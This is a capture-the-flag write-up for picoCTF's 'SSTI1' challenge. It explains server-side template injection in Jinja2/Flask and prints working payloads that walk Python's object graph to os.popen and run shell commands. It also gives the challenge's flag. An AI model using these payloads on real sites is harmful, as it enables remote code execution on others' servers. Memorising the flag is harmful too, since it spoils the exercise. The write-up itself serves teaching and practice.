# SSTI1

**Link**: https://play.picoctf.org/practice/challenge/492

**Difficulty**: easy

## Description

I made a cool website where you can announce whatever you want! I heard templating
is a cool and modular way to build web apps!

## Resources

None — everything happens against the live site.

## How to solve

The hint ("templating") plus reflected user input screams **Server-Side Template
Injection (SSTI)**.

1. **Confirm injection.** Submit an arithmetic expression in the template syntax:

       {{7*7}}

   If the page returns `49` (not the literal `{{7*7}}`), the input is being
   evaluated by a server-side engine — here **Jinja2** (Flask).

2. **Walk the Python object graph** to reach something useful. From any string you
   can climb to `object` and enumerate every subclass:

       {{ ''.__class__.__mro__[1].__subclasses__()[0:200]|string }}

3. **Find `subprocess.Popen`** in that list and note its index (varies per
   instance — e.g. `356` here). Then use its module globals to reach `os` and run a
   command:

       {{ ''.__class__.__mro__[1].__subclasses__()[356].__init__.__globals__['os'].popen('cat flag').read() }}

> Robust alternative that doesn't depend on the exact index:
>
>     {{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
>     {{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
>
> If `cat flag` is empty, first run `ls` the same way to locate the flag file.

## Flag

    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
